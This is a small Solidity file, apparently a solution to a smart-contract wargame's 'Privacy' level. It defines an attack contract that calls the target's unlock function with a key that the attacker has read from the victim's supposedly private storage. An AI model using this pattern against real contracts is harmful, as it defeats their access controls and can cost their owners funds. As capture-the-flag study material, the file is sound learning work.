pragma solidity ^0.4.18;

import "levels/Privacy.sol";

// contract PrivacyHack {
//     Privacy target;
    
//     constructor(address _target) public {
//         target = Privacy(_target);
//     }

//     // malicious attacker must pass in key because contracts
//     // cannot read storage of other contracts and victim contract's 
//     // state variable "bytes32[3] private data;" does not have a getter
//     function attack(bytes16 _key) public {
//         target.call(bytes4(keccak256("unlock(bytes4)")), _key);
//     }
// }


contract PrivacyHack {
    // malicious attacker must pass in key because contracts
    // cannot read storage of other contracts and victim contract's 
    // state variable "bytes32[3] private data;" does not have a getter
    function attack(address _target, bytes16 _key) public {
        // Privacy(_target).unlock(_key);
        Privacy target = Privacy(_target);
        target.call(bytes4(keccak256("unlock(bytes16)")), _key);
    }
}